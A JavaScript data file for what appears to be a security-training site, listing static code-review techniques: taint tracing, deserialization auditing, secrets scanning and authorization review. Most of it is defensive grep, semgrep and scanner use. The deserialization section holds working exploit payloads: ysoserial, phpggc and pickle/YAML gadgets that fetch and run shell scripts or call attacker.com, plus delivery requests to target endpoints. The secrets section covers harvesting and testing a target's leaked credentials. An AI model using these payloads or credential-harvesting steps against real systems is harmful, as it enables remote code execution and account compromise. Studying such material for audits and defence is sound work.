export const sastTechniques = [
  {
    id: 'sast-taint-analysis-deep',
    title: 'Source Code Taint Analysis — Manual Dataflow Tracing',
    subtitle: 'Systematically trace untrusted user input from source to sink to identify injection vulnerabilities without running the application',
    tags: ['taint analysis', 'dataflow', 'source', 'sink', 'sanitizer', 'propagation', 'manual SAST', 'code review'],
    accentColor: 'cyan',
    overview: 'Taint analysis tracks "tainted" data (user-controlled input) as it flows through the codebase from sources (HTTP parameters, headers, cookies, file uploads) to sinks (SQL queries, command execution, file writes, HTML rendering). Any path from source to sink that lacks proper sanitization is a potential vulnerability. Manual taint analysis is more accurate than automated tools because it understands application-specific context, custom frameworks, and semantic sanitizers that tools flag as safe.',
    steps: [
      'Identify all taint SOURCES: HTTP request parameters, headers, cookies, file uploads, environment variables, database reads',
      'Identify all dangerous SINKS: SQL string concatenation, exec()/system()/popen(), file read/write paths, eval(), innerHTML/document.write, deserialization calls',
      'Identify SANITIZERS: escaping functions, parameterized queries, allowlists — these break taint propagation',
      'Trace flows: follow the variable from source through function calls, assignments, string operations to sinks',
      'Check sanitizer adequacy: is the sanitizer applied at the right point? Does it cover all injection contexts?',
      'Document paths: for each vulnerability, describe the complete source → propagation → sink chain with line numbers',
    ],
    commands: [
      {
        title: 'Manual taint tracing methodology',
        code: `# === Python: Identify taint sources in Flask/Django ===
# Sources to grep for:
grep -rn "request\\.args\\.get\\|request\\.form\\.get\\|request\\.values\\.get\\|request\\.json\\|request\\.data" --include="*.py" .
grep -rn "request\\.GET\\[\\|request\\.POST\\[\\|request\\.GET\\.get\\|request\\.POST\\.get" --include="*.py" .  # Django
grep -rn "os\\.environ\\.get\\|os\\.getenv\\|sys\\.argv" --include="*.py" .

# Sinks to grep for:
grep -rn "execute(\\|executemany(\\|raw(\\|cursor\\.execute" --include="*.py" .   # SQLi
grep -rn "subprocess\\.run\\|subprocess\\.call\\|os\\.system\\|os\\.popen\\|exec(" --include="*.py" .  # RCE
grep -rn "open(\\|Path(\\|os\\.path\\.join" --include="*.py" .                    # File traversal
grep -rn "pickle\\.loads\\|yaml\\.load[^_]\\|marshal\\.loads\\|eval(" --include="*.py" .  # Deserialization
grep -rn "render_template_string\\|jinja2\\.Template\\|Template(" --include="*.py" .      # SSTI

# === JavaScript/Node.js: taint sources and sinks ===
# Sources:
grep -rn "req\\.query\\|req\\.params\\|req\\.body\\|req\\.headers" --include="*.js" --include="*.ts" .

# Sinks (Node.js RCE)
grep -rn "child_process\\.exec\\|spawn(\\|execSync\\|eval(\\|Function(" --include="*.js" .

# SQL sinks (Node.js)
grep -rn "\\.query(\\|\.execute(\\|\.raw(\\|\\\`SELECT\\|\\\`INSERT\\|\\\`UPDATE\\|\\\`DELETE" --include="*.js" .

# === Java: taint tracking ===
# Sources:
grep -rn "getParameter(\\|getHeader(\\|getCookie(\\|getQueryString(\\|getInputStream(" --include="*.java" .

# Sinks (Java):
grep -rn "Runtime\\.exec\\|ProcessBuilder\\|\\.execute(\\|\\.executeQuery(\\|\\.executeUpdate(" --include="*.java" .
grep -rn "ObjectInputStream\\|readObject(\\|XMLDecoder\\|XStream\\.fromXML" --include="*.java" .  # Deserialization

# === PHP: taint sources and sinks ===
# Sources:
grep -rn "\\$_GET\\[\\|\\$_POST\\[\\|\\$_REQUEST\\[\\|\\$_COOKIE\\[\\|\\$_SERVER\\[\\|\\$_FILES\\[" --include="*.php" .

# Sinks (PHP):
grep -rn "mysqli_query\\|mysql_query\\|PDO::query\\|pg_query\\|sqlite_query" --include="*.php" .  # SQLi
grep -rn "system(\\|exec(\\|passthru(\\|shell_exec(\\|popen(\\|proc_open(" --include="*.php" .   # RCE
grep -rn "include(\\$\\|require(\\$\\|include_once(\\$\\|require_once(\\$" --include="*.php" .   # LFI
grep -rn "unserialize(\\|eval(\\|preg_replace.*\\/e\\b" --include="*.php" .                      # Deser/code exec`
      },
      {
        title: 'Automated taint analysis with semgrep and CodeQL',
        code: `# === Semgrep — semantic grep for code patterns ===
pip install semgrep

# Run against Python app
semgrep --config=p/python-security .
semgrep --config=p/flask .
semgrep --config=p/django .
semgrep --config=p/nodejs .
semgrep --config=p/java .
semgrep --config=p/php-security .

# Custom rule: user input to SQL query (SQLi)
# File: rules/sqli.yaml
cat > sqli_rule.yaml << 'EOF'
rules:
  - id: sqli-user-input-concat
    mode: taint
    pattern-sources:
      - pattern: request.args.get(...)
      - pattern: request.form.get(...)
      - pattern: request.json[...]
    pattern-sinks:
      - pattern: cursor.execute(...)
      - pattern: db.session.execute(...)
      - pattern: $CONN.execute(...)
    message: "Possible SQL injection: user input flows to execute()"
    languages: [python]
    severity: ERROR
EOF
semgrep --config=sqli_rule.yaml .

# Custom rule: SSTI (Server-Side Template Injection)
cat > ssti_rule.yaml << 'EOF'
rules:
  - id: ssti-render-template-string
    mode: taint
    pattern-sources:
      - pattern: request.args.get(...)
      - pattern: request.form.get(...)
    pattern-sinks:
      - pattern: render_template_string(...)
      - pattern: jinja2.Template(...).render(...)
    message: "SSTI: user input flows to template rendering"
    languages: [python]
    severity: ERROR
EOF

# === CodeQL — deep semantic analysis ===
# Install: https://codebase.github.com/codeql
# Create CodeQL database for Python
codeql database create mydb --language=python --source-root=/path/to/code

# Run built-in security queries
codeql database analyze mydb python-security-and-quality.qls --format=sarif-latest --output=results.sarif

# Custom CodeQL query: trace request parameter to SQL
cat > custom_sqli.ql << 'EOF'
import python
import semmle.python.security.dataflow.SqlInjectionQuery

from SqlInjection::Configuration cfg, DataFlow::PathNode source, DataFlow::PathNode sink
where cfg.hasFlowPath(source, sink)
select sink.getNode(), source, sink,
  "SQL injection: user input at $@ flows to SQL query here", source.getNode(), "source"
EOF
codeql query run custom_sqli.ql --database=mydb --output=results.bqrs`
      }
    ]
  },

  {
    id: 'sast-deserialization-audit',
    title: 'Deserialization Vulnerability Audit',
    subtitle: 'Identify unsafe deserialization sinks across Java, Python, PHP, .NET and craft exploit gadget chains',
    tags: ['deserialization', 'Java RCE', 'ysoserial', 'pickle', 'PHP unserialize', '.NET BinaryFormatter', 'gadget chain', 'ObjectInputStream'],
    accentColor: 'cyan',
    overview: 'Deserialization vulnerabilities occur when applications deserialize untrusted data without validation. The attacker provides a crafted serialized object whose deserialization triggers a "gadget chain" — a sequence of classes already present in the classpath/process that, when instantiated via deserialization, execute arbitrary code. Java is the most exploited platform (ysoserial), but Python pickle, PHP unserialize, Ruby Marshal, .NET BinaryFormatter, and YAML parsers are all vulnerable. The key insight: the exploit uses classes already in the application (no custom code needed), making it dependency-chain specific.',
    steps: [
      'Identify deserialization calls: Java ObjectInputStream.readObject(), Python pickle.loads(), PHP unserialize(), .NET BinaryFormatter.Deserialize()',
      'Determine if input is user-controlled: HTTP request body, cookie, query parameter, file upload, database read',
      'Identify available gadget chain libraries in classpath: Commons-Collections, Spring, Hibernate, Groovy are common',
      'Use ysoserial (Java) to generate payload for the specific gadget chain and library version',
      'Check for custom deserialization handlers: readObject() overrides may limit exploitability',
      'Test with a canary: use sleep(3) or DNS lookup payload before attempting RCE to confirm vulnerability',
    ],
    commands: [
      {
        title: 'Java deserialization audit and exploitation',
        code: `# === Java: find deserialization sinks ===
grep -rn "ObjectInputStream\\|readObject(\\|readUnshared(\\|readResolve(" --include="*.java" .
grep -rn "XMLDecoder\\|XStream\\.fromXML\\|JsonParser\\|ObjectMapper\\.readValue" --include="*.java" .

# Check classpath for vulnerable gadget libraries
# Inside the JAR/WAR:
jar tf target.war | grep -iE "commons-collections|commons-beanutils|spring-|groovy-|hibernate-"
unzip -l target.war WEB-INF/lib/*.jar | grep -iE "commons-collect|beanutils"

# Find specific vulnerable versions
find . -name "commons-collections*.jar" | xargs -I{} jar tf {} | grep "^org/apache/commons" | head -5

# === ysoserial: generate Java deserialization payloads ===
# https://github.com/frohoff/ysoserial
java -jar ysoserial.jar | head -30   # List available gadget chains

# CommonsCollections1 — for CC 3.1 / CC 4.0 + Java < 8u191
java -jar ysoserial.jar CommonsCollections1 "touch /tmp/pwned" > payload.ser

# CommonsCollections6 — works without Java 8 restrictions (most versatile)
java -jar ysoserial.jar CommonsCollections6 "curl http://attacker.com/$(hostname)" > payload.ser

# Spring1 — Spring Framework gadget chain
java -jar ysoserial.jar Spring1 "wget http://attacker.com/shell.sh -O /tmp/s.sh && bash /tmp/s.sh" > payload.ser

# DNS callback (canary — confirms vuln without RCE)
java -jar ysoserial.jar CommonsCollections6 "nslookup attacker.com" > canary.ser

# Deliver payload to HTTP endpoint
curl -X POST https://target.com/api/deserialize \\
  -H "Content-Type: application/octet-stream" \\
  --data-binary @payload.ser

# Base64-encoded delivery (some apps expect base64)
base64 -w 0 payload.ser | xargs -I{} curl -X POST https://target.com/api/data \\
  -H "Content-Type: application/json" \\
  -d "{\\"data\\":\\"{}\\"}"

# JNDI injection (Log4Shell-style) — LDAP gadget
java -jar ysoserial.jar JNDI "ldap://attacker.com/Exploit" > jndi.ser`
      },
      {
        title: 'Python pickle and PHP unserialize exploitation',
        code: `# === Python: pickle deserialization RCE ===
# Find pickle usage in source
grep -rn "pickle\\.load\\|pickle\\.loads\\|cPickle\\.load\\|shelve\\.open" --include="*.py" .

# Craft malicious pickle payload
import pickle, os

class Exploit(object):
    def __reduce__(self):
        # __reduce__ is called during unpickling
        return (os.system, ('curl http://attacker.com/callback',))

# Serialize the payload
payload = pickle.dumps(Exploit())
print("Payload (hex):", payload.hex())

# Deliver via HTTP cookie, request body, or file upload
import requests
cookies = {"session": __import__("base64").b64encode(payload).decode()}
requests.get("https://target.com/dashboard", cookies=cookies)

# === Python YAML deserialization ===
# yaml.load() without Loader= argument uses FullLoader or Loader — can execute Python
# Vulnerable:
import yaml
yaml.load(user_input)              # DANGEROUS — uses Loader=yaml.FullLoader (still limited)
yaml.load(user_input, Loader=yaml.Loader)  # VERY DANGEROUS — arbitrary code exec

# Payload:
malicious_yaml = """
!!python/object/apply:os.system
args: ['curl http://attacker.com/callback']
"""
yaml.load(malicious_yaml, Loader=yaml.Loader)  # Executes os.system

# === PHP: unserialize exploitation ===
# Find unserialize in PHP source
grep -rn "unserialize(\\|json_decode.*assoc.*true" --include="*.php" .

# Generate PHP deserialization payload using phpggc
# https://github.com/ambionics/phpggc
phpggc -l                          # List available gadget chains
phpggc Laravel/RCE1 system id      # Laravel + RCE via system()
phpggc Symfony/RCE4 exec "id > /tmp/pwned"
phpggc Yii2/RCE1 system "curl attacker.com"
phpggc -b Laravel/RCE1 system id  # Base64-encoded output

# Deliver via cookie or POST parameter
curl -X POST https://target.com/profile \\
  -b "session=$(phpggc -b Laravel/RCE1 system id)" \\
  -d "data=normal"`
      },
      {
        title: '.NET BinaryFormatter and JSON.NET deserialization',
        code: `# === .NET: find deserialization sinks ===
grep -rn "BinaryFormatter\\|SoapFormatter\\|NetDataContractSerializer\\|ObjectStateFormatter\\|LosFormatter" --include="*.cs" .
grep -rn "JavaScriptSerializer\\|Json.NET\\|Newtonsoft.Json\\|TypeNameHandling" --include="*.cs" .
grep -rn "TypeNameHandling.All\\|TypeNameHandling.Objects\\|TypeNameHandling.Auto" --include="*.cs" .

# ysoserial.net — .NET deserialization payload generator
# https://github.com/pwntester/ysoserial.net

# BinaryFormatter payload
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate \\
  -o base64 -c "calc.exe"

# JSON.NET with TypeNameHandling — ObjectDataProvider gadget
ysoserial.exe -f Json.Net -g ObjectDataProvider \\
  -o raw -c "powershell -enc BASE64PAYLOAD"

# JSON.NET TypeConfuseDelegate
ysoserial.exe -f Json.Net -g TypeConfuseDelegate \\
  -o base64 -c "cmd /c curl attacker.com"

# ViewState exploitation (.NET WebForms)
# Requires MachineKey from web.config
ysoserial.exe -p ViewState -g TypeConfuseDelegate \\
  -c "powershell -enc BASE64PAYLOAD" \\
  --path="/admin/dashboard.aspx" \\
  --apppath="/" \\
  --decryptionalg="AES" \\
  --decryptionkey="MACHINE_KEY_FROM_CONFIG" \\
  --validationalg="SHA1" \\
  --validationkey="VALIDATION_KEY_FROM_CONFIG"

# Deliver ViewState payload
curl -X POST https://target.com/admin/dashboard.aspx \\
  -d "__VIEWSTATE=PAYLOAD&__VIEWSTATEGENERATOR=..."`
      }
    ]
  },

  {
    id: 'sast-secrets-static-scan',
    title: 'Secrets & Credential Discovery — Static Repository Analysis',
    subtitle: 'Systematically extract hardcoded secrets, API keys, private keys, and credential material from source code and git history',
    tags: ['secrets scanning', 'git history', 'hardcoded keys', 'truffleHog', 'gitleaks', 'credential exposure', 'private key', 'API key'],
    accentColor: 'cyan',
    overview: 'Source code repositories are one of the most common places organisations accidentally commit secrets: AWS access keys, database passwords, private keys, OAuth tokens, and internal API endpoints. Git history is permanent — even after a secret is "deleted" from the code, it remains accessible via git log. Regular expression-based scanning combined with entropy analysis detects secrets that simple grep misses. Public GitHub repositories of target organisations routinely contain valid credentials.',
    steps: [
      'Clone all public repositories for the target organisation: GitHub, GitLab, Bitbucket',
      'Run truffleHog against all repos — it scans git history with entropy analysis and regex signatures',
      'Run gitleaks with the default config — covers 100+ secret types with high-precision patterns',
      'Manually grep for high-value patterns: AWS, GCP, Azure, database URIs, JWT signing keys',
      'Check .env files, config files, and infrastructure-as-code (Terraform, Ansible, CloudFormation)',
      'Test found credentials: AWS keys with aws sts get-caller-identity, database URIs, API keys with their respective APIs',
    ],
    commands: [
      {
        title: 'Repository secret scanning — truffleHog and gitleaks',
        code: `# === truffleHog — git history + entropy analysis ===
pip install trufflehog

# Scan a git repo (including full history)
trufflehog git file://./target-repo --json --only-verified

# Scan GitHub org (public repos)
trufflehog github --org=TargetCorp --json --only-verified

# Scan specific GitHub user
trufflehog github --user=targetuser --json

# Scan a specific repo via URL
trufflehog git https://github.com/TargetCorp/webapp.git --json

# === gitleaks — comprehensive secret scanner ===
# Install: https://github.com/gitleaks/gitleaks
gitleaks detect --source=./target-repo --verbose
gitleaks detect --source=./target-repo --report-format=json --report-path=leaks.json

# Scan git history (all commits)
gitleaks detect --source=./target-repo --log-opts="--all" --verbose

# Use custom rules
gitleaks detect --config=custom-rules.toml --source=./target-repo

# === Manual grep patterns for high-value secrets ===
# AWS credentials
grep -rn "AKIA[0-9A-Z]{16}" . --include="*.py" --include="*.js" --include="*.json" --include="*.env" --include="*.yml" --include="*.yaml" --include="*.tf"
grep -rn "aws_secret_access_key\|AWS_SECRET\|SecretAccessKey" . -r

# Private keys
grep -rn "BEGIN RSA PRIVATE KEY\\|BEGIN OPENSSH PRIVATE KEY\\|BEGIN EC PRIVATE KEY\\|BEGIN PGP PRIVATE KEY" -r .
find . -name "*.pem" -o -name "*.key" -o -name "*.p12" -o -name "*.pfx" 2>/dev/null

# Database connection strings
grep -rn "postgresql://\\|mysql://\\|mongodb://\\|mongodb+srv://\\|redis://" -r .
grep -rn "DB_PASSWORD\\|DATABASE_URL\\|MONGO_URI\\|REDIS_URL" -r .

# JWT signing secrets
grep -rn "JWT_SECRET\\|JWT_KEY\\|jwt_secret\\|SECRET_KEY\\|SECRET_TOKEN" -r .

# Google / GCP
grep -rn "AIza[0-9A-Za-z-_]{35}\\|GOCSPX-\\|ya29\\." -r .  # GCP API key, OAuth

# Slack tokens
grep -rn "xox[baprs]-" -r .

# GitHub tokens
grep -rn "ghp_[0-9a-zA-Z]{36}\\|gho_[0-9a-zA-Z]{36}\\|github_pat_" -r .

# Stripe
grep -rn "sk_live_[0-9a-zA-Z]{24}\\|sk_test_[0-9a-zA-Z]{24}" -r .

# === Git history archaeology ===
# Find all commits that touched .env files
git log --all --full-history -- "*.env" | grep "^commit"
git show COMMIT_HASH:.env  # Recover deleted .env from history

# Find all secret-looking strings ever committed
git log --all -p | grep -E "password|secret|api_key|token|credential" | head -50

# Search across ALL branches for secrets
git branch -a | while read branch; do
  git checkout "$branch" 2>/dev/null
  grep -rn "AWS_SECRET\|PRIVATE_KEY" . --include="*.py" 2>/dev/null
done`
      },
      {
        title: 'Infrastructure-as-code (IaC) security audit',
        code: `# === Terraform secret and misconfiguration scanning ===
# tfsec — Terraform static analysis
tfsec ./infrastructure/
tfsec ./terraform/ --format=json --out=tfsec-results.json

# checkov — multi-IaC scanner (Terraform, CloudFormation, K8s, Ansible)
pip install checkov
checkov -d ./terraform/ --output json
checkov -d ./k8s-manifests/ --output json
checkov -f ./cloudformation.yaml

# Common Terraform secrets to grep for:
grep -rn "password\\s*=" --include="*.tf" .
grep -rn "secret\\s*=" --include="*.tf" .
grep -rn "access_key\\|secret_key" --include="*.tf" .
# Proper: should use variables or AWS Secrets Manager references, NOT hardcoded values

# === Docker/K8s misconfiguration ===
# trivy — IaC misconfiguration + secrets
trivy config ./docker-compose.yml
trivy config ./kubernetes/
trivy config ./Dockerfile

# Find secrets in Docker Compose
grep -rn "password:\\|secret:\\|key:" --include="docker-compose*.yml" .

# Find K8s secrets in plaintext
kubectl get secret -o yaml --all-namespaces  # If you have cluster access
grep -rn "password:\\|secret:\\|stringData:" --include="*.yaml" . # In k8s manifests

# === GitHub Actions workflow audit ===
# Secrets exposed via workflow
find .github/workflows -name "*.yml" -exec cat {} \\; | \\
  grep -iE "env:|secrets\\." | grep -v "secrets\\."
# Any hardcoded value in "env:" in a workflow that should be \${{ secrets.NAME }}

# OIDC misconfiguration: check workflow permissions
find .github/workflows -name "*.yml" | xargs grep -l "id-token: write" | \\
  xargs grep -l "contents: write"  # Both together = excessive OIDC claims`
      }
    ]
  },

  {
    id: 'sast-logic-vulnerability-audit',
    title: 'Business Logic Vulnerability Analysis — Manual Code Review',
    subtitle: 'Identify auth bypass, privilege escalation, and state machine violations by reading the application\'s access control logic',
    tags: ['business logic', 'auth bypass', 'privilege escalation', 'state machine', 'IDOR', 'mass assignment', 'race condition', 'flow bypass'],
    accentColor: 'cyan',
    overview: 'Business logic vulnerabilities cannot be found by automated tools because they require understanding what the application is SUPPOSED to do. Auth bypass via parameter manipulation, privilege escalation through mass assignment, and multi-step workflow skipping are examples. These flaws exist in the intersection of code structure and intended business rules — a security-focused code review with the application\'s business context in mind is required. Key questions: what access control check is missing? What state can be manipulated? What parameter is trusted that shouldn\'t be?',
    steps: [
      'Map all user roles and their intended permissions from README/documentation before reading code',
      'Find all authorization checks: @login_required, @admin_only, request.user.is_admin, JWT claims verification',
      'For every sensitive endpoint, trace whether authorization is enforced at the function level or only at the URL routing level',
      'Look for mass assignment patterns: models created directly from request data without field allowlisting',
      'Identify multi-step workflows: account upgrade, payment, verification — can steps be skipped or replayed?',
      'Find IDOR patterns: object lookups by ID without ownership checks — user.id or resource.owner != request.user',
    ],
    commands: [
      {
        title: 'Authorization and IDOR audit patterns',
        code: `# === Python/Django: authorization audit ===
# Find all views missing login/permission decorators
grep -rn "^def " --include="*.py" . | grep -v "@login_required\\|@permission_required\\|@admin_required"
# Check views.py files directly:
grep -B5 "def " views.py | grep -E "def |@"  # Show decorators before each function

# Find mass assignment vulnerabilities (accepting all fields from request)
grep -rn "Model\\.objects\\.create(\\*\\*request\\.data)\\|serializer\\.save()\\|form\\.save()" --include="*.py" .
# Vulnerable pattern: MyModel.objects.create(**request.POST.dict())
# Safe: MyModel.objects.create(name=request.data['name'], price=request.data['price'])

# Find IDOR patterns (no ownership check)
grep -rn "\\.get(id=\\|filter(id=" --include="*.py" .
# Vulnerable: obj = Model.objects.get(id=request.data['id'])
# Safe: obj = Model.objects.get(id=request.data['id'], owner=request.user)

# === Node.js/Express: authorization audit ===
# Find routes without auth middleware
grep -rn "router\\.(get\\|post\\|put\\|delete)(" --include="*.js" . | \\
  grep -v "authMiddleware\\|authenticate\\|requireAuth\\|verifyToken"

# Mass assignment (Mongoose)
grep -rn "new Model(req\\.body)\\|Model\\.create(req\\.body)\\|\\.save(req\\.body)" --include="*.js" .

# JWT verification missing
grep -rn "jwt\\.verify\\|verifyToken" --include="*.js" . 
# Check that jwt.verify is CALLED, not just jwt.decode (decode has no verification!)
grep -rn "jwt\\.decode(" --include="*.js" .  # These are DANGEROUS — no signature check

# === Ruby on Rails: audit ===
# Mass assignment (strong parameters bypass)
grep -rn "params\\.permit!\\|\\.merge(params)\\|params\\.require" --include="*.rb" .
# params.permit! = permits ALL parameters = mass assignment

# Before action authorization
grep -rn "before_action :authenticate_user!\\|before_action :authorize" --include="*.rb" .
# Find controllers without before_action
grep -rn "class.*Controller" --include="*.rb" . | \\
  xargs -I{} grep -L "before_action :authenticate" {}  # Missing auth in controllers

# === General: find hardcoded admin checks ===
grep -rn "is_admin.*==.*true\\|role.*==.*['\"]admin['\"]\\|admin.*==.*1" -r . --include="*.py" --include="*.js" --include="*.rb"
# Context: is this check enforced server-side or can it be bypassed client-side?

# === State machine bypass audit ===
# Find workflow state fields
grep -rn "status\\|state\\|step\\|phase\\|stage" --include="*.py" . | grep "=\\.get\\|=\\.form"
# Check: is the current state validated before transition?
# Vulnerable: order.status = request.data['status']  (user controls state)
# Safe: if order.status == 'pending': order.status = 'processing'`
      }
    ]
  },
];